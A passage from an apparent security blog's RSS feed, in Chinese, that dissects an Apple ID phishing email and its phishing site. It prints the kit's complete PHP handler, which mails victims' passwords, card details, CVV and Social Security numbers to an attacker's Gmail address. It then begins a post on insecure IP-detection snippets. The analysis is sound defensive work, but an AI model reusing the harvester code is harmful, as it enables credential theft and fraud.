&lt;p&gt;再回頭來以這封信為例，最大的破綻除了非制式的內文之外，就屬署名了。明明是假造「Apple Customer Support」的來信，最下面卻簽署「Microsoft Privacy and cookies Developers」，有沒有搞錯？可以再用點心嗎？&lt;/p&gt;

&lt;h4 id=&quot;連結&quot;&gt;連結&lt;/h4&gt;

&lt;p&gt;最後的重點就是信件中的釣魚連結了，通常這個連結會帶你前往一個長得跟官方網站一模一樣的登入頁面，騙你輸入帳號密碼登入來竊取。在點選超連結之前，一定要先看一下這個連結前往的位置是不是官方的位置，例如是 Apple 的信件通常就會是前往 Apple.com 自己的網域名稱。當然更要特別注意的是假造的網域名稱，例如使用「App1e.com」來偽裝成「Apple.com」，也是非常常見的。&lt;/p&gt;

&lt;p&gt;這封信中使用了最不用心的用法，就是直接拿釣魚網站的 URL 來當連結，一來長得跟官方網域根本不像，二來落落長的連結，到底是想要騙誰點選呢？&lt;/p&gt;

&lt;h3 id=&quot;信件標頭藏有攻擊者的蛛絲馬跡&quot;&gt;信件標頭藏有攻擊者的蛛絲馬跡&lt;/h3&gt;

&lt;p&gt;收到惡意郵件、釣魚郵件，一定要好好看信件的標頭檔（Header）。裡面通常可以看到攻擊者發信的來源，例如是自己架設的發信伺服器或者是使用肉雞來發信。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot; alt=&quot;Apple ID 釣魚信 Header&quot; title=&quot;Apple ID 釣魚信 Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;信件標頭最重要的就是「Received」這個部分，要由下往上閱讀。從這邊我們可以看到信件的流向，從攻擊發起者到發信伺服器，中間經過其他伺服器的轉送，最後到收到釣魚信件的郵件伺服器。因此從最下面的 Received 位置，我們可以知道攻擊者是從「selecttr@cloud.httpdns.co」來寄送信件的，因此 cloud.httpdns.co 很有可能就是攻擊者的伺服器，或者是被駭來發信的伺服器。&lt;/p&gt;

&lt;p&gt;如果覺得信件的標頭太長難以閱讀，可以利用 Google 提供的工具「&lt;a href=&quot;https://toolbox.googleapps.com/apps/messageheader/&quot;&gt;Google Apps Toolbox - Messageheader&lt;/a&gt;」。只要把信件的標頭貼上，他就會自動分析信件的流向，如下圖。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot; alt=&quot;檢查信件 header&quot; title=&quot;檢查信件 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;釣魚網頁也請你注重安全啊&quot;&gt;釣魚網頁，也請你注重安全啊。&lt;/h3&gt;

&lt;p&gt;接著我們來看一下釣魚頁面。通常「正常」的釣魚頁面都會做得跟官方一模一樣，因為通常攻擊者都會直接把官方網站上面的 HTML 直接下載下來修改。如果有做得不像的，就真的是太不用心的攻擊者。&lt;/p&gt;

&lt;p&gt;我們可以看到這個釣魚頁面做得非常像，上面要你輸入帳號、密碼、姓名、生日、信用卡號等資訊，非常惡劣。唯有網址實在是太假，希望沒有人眼拙真的以為這是 Apple 的網站。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot; alt=&quot;Apple ID 釣魚網頁&quot; title=&quot;Apple ID 釣魚網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;秉持的資安研究員的好習慣，我們把網址子目錄去掉，看看網站的根目錄長什麼樣子，結果讓人跌破眼鏡。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot; alt=&quot;釣魚網頁開放目錄瀏覽&quot; title=&quot;釣魚網頁開放目錄瀏覽&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;釣魚網站也請你注重安全啊！&lt;/strong&gt;這個網站大剌剌的開著目錄索引，讓我們可以看到網站上的各個目錄、檔案。除了 Apple 的釣魚網頁之外，甚至有釣魚網頁的原始碼「connect-info.zip」，更有著其他釣魚網頁在同個站上。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot; alt=&quot;站上其他釣魚頁面&quot; title=&quot;站上其他釣魚頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;既然可以瀏覽，那我們來看看釣魚網頁的原始碼寫得怎樣。抓下來解開之後會看到完整的釣魚網頁，以及接收受騙人資料的主程式「Snd.php」。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot; alt=&quot;下載釣魚網頁原始碼&quot; title=&quot;下載釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;釣魚網頁的程式寫得非常簡單，僅把網頁上接收到的被害人資料、IP，寄送到他的信箱「 justforhacke@gmail.com 」，寄送完畢後會自動導向到官方的頁面偽裝。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot; alt=&quot;釣魚網頁原始碼&quot; title=&quot;釣魚網頁原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果釣魚網頁寫得不好，甚至我們有機會可以攻擊他釣魚網頁上的漏洞，直接取得主機的權限，解救世人。從原始碼我們一目了然釣魚網頁的行為、寫法，也可以尋找有無攻擊的機會。&lt;/p&gt;

&lt;h4 id=&quot;釣魚網頁原始碼備份&quot;&gt;釣魚網頁原始碼備份&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gethostbyaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;------------+| AppLe VbV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Apple ID                    : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee000&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Password                    : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee001&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Full Name                   : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee01&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Date of Birth               : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee02&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee3&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee4&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Number Of Credit Card       : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee5&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;CVC (CVV)                   : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee6&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Expiration Date             : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee7&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee8&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Social Security Number      : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee9&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;------------+| APpLe VBV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Fr0m &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;justforhacke@gmail.com&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Apple Result | Fr0m &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;From: Apple Results &amp;lt;justforhacke@gmail.com&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;eMailAdd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;MIME-Version: 1.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Location:https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;釣魚郵件不死別再把自己當成肥羊了&quot;&gt;釣魚郵件不死，別再把自己當成肥羊了！&lt;/h3&gt;

&lt;p&gt;釣魚攻擊最早從 1995 年就開始盛行，一直到快 20 年後的今天，都還是一個非常簡單又有效率的攻擊手法。收到郵件千萬別傻傻的輸入自己的個資、帳號密碼，仔細看一下攻擊者的破綻，別讓他得逞了。&lt;/p&gt;

&lt;p&gt;如果有發現疑似釣魚網站，又無法確認，可以到 &lt;a href=&quot;http://www.phishtank.com/&quot;&gt;PhishTank&lt;/a&gt; 來查查看，找到釣魚網站也可以投稿一下幫助其他人！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/03/apple-id-phishing-scam/</link>
                <guid>https://devco.re/blog/2014/07/03/apple-id-phishing-scam</guid>
                <pubDate>Thu, 03 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>如何正確的取得使用者 IP？</title>
                <description>&lt;p&gt;很多網站都會有偵測使用者 IP 的功能，不管是判斷使用者來自哪邊，或者是記錄使用者的位置。但是你知道嗎？網路上大多數的教學全部都是「錯誤」的。正確的程式寫法可以確保知道訪客的 IP，但是錯誤的寫法卻可能讓網站管理者永遠不知道犯罪者的來源。&lt;/p&gt;

&lt;p&gt;這次我們單就偵測 IP 的議題來探討各種錯誤的寫法。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;你知道網路上的教學是不安全的嗎&quot;&gt;你知道網路上的教學是不安全的嗎？&lt;/h3&gt;

&lt;p&gt;我們先來看一下網路上的教學，讓我們 Google 找一下「&lt;a href=&quot;https://www.google.com.tw/search?q=php+取得+ip&quot;&gt;PHP 取得 IP&lt;/a&gt;」，就可以看到許多人熱心的教學，我們隨意挑一個常見的教學來看看。&lt;/p&gt;

&lt;p&gt;以 PHP 為例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_CLIENT_IP&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_CLIENT_IP&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;以 ASP.NET 為例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c#&quot; data-lang=&quot;c#&quot;&gt;&lt;span class=&quot;n&quot;&gt;Dim&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;HTTP_X_FORWARDED_FOR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
